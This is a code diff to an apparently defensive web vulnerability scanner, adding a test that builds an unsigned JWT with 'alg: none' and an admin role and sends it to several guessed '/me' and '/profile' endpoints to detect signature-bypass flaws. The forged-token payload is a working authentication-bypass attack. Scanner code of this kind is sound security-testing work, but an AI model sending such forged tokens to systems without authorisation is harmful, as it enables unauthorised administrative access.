@@ -2,11 +2,13 @@
 Authentication Detector — SEPARATE from CSRF.
 
 Tests: weak passwords, user enumeration, missing rate limiting,
-unauthenticated access to protected endpoints.
+unauthenticated access to protected endpoints, JWT none algorithm.
 """
 
 from typing import List
 import time
+import base64
+import json as _json
 
 from .base_detector import BaseDetector, DetectorResult
 from ..models.test_state import TestState
@@ -156,6 +158,41 @@ class AuthDetector(BaseDetector):
                                 remediation="Require authentication on all state-changing and data-access endpoints.",
                                 evidence=[Evidence(description="Endpoint returns full content without authentication")],
                             ))
+
+        # --- Test 4: JWT 'none' algorithm vulnerability ---
+        for ep in login_endpoints[:2]:
+            tested += 1
+            # Try a JWT with alg=none — forge a token without a valid signature
+            # Header: {"alg":"none","typ":"JWT"} Payload: {"sub":"admin","role":"admin"}
+            header_b64 = base64.urlsafe_b64encode(
+                _json.dumps({"alg": "none", "typ": "JWT"}).encode()
+            ).rstrip(b'=').decode()
+            payload_b64 = base64.urlsafe_b64encode(
+                _json.dumps({"sub": "1", "role": "admin", "iat": 9999999999}).encode()
+            ).rstrip(b'=').decode()
+            forged_jwt = f"{header_b64}.{payload_b64}."  # Empty signature
+
+            # Try the forged JWT against a likely /me or /profile endpoint
+            base_origin = ep.url.split('/login')[0].split('/auth')[0]
+            for me_path in ['/api/me', '/api/v1/me', '/me', '/api/profile', '/api/user']:
+                resp = engine.request(
+                    "GET", base_origin + me_path,
+                    headers={"Authorization": f"Bearer {forged_jwt}"}
+                )
+                if resp.has_response and resp.status_code == 200 and resp.body and len(resp.body) > 20:
+                    signals = ["token_accepted_without_signature: JWT none algorithm accepted — auth bypass"]
+                    confidence = ConfidenceResult.from_signals(signals)
+                    findings.append(StandardFinding(
+                        vulnerability="JWT None Algorithm Vulnerability",
+                        category=self.category, severity="CRITICAL",
+                        confidence=confidence, status=TestState.VULNERABLE,
+                        endpoint=base_origin + me_path, method="GET",
+                        cvss=CVSSInfo(score=9.8, vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", severity="CRITICAL"),
+                        owasp=self.owasp, cwe="CWE-347",
+                        remediation="Explicitly reject JWT tokens with 'none' algorithm. Use a whitelist of allowed algorithms.",
+                        evidence=[Evidence(description=s) for s in signals],
+                    ))
+                    break
 
         # Overall state
         vuln = [f for f in findings if f.status == TestState.VULNERABLE]
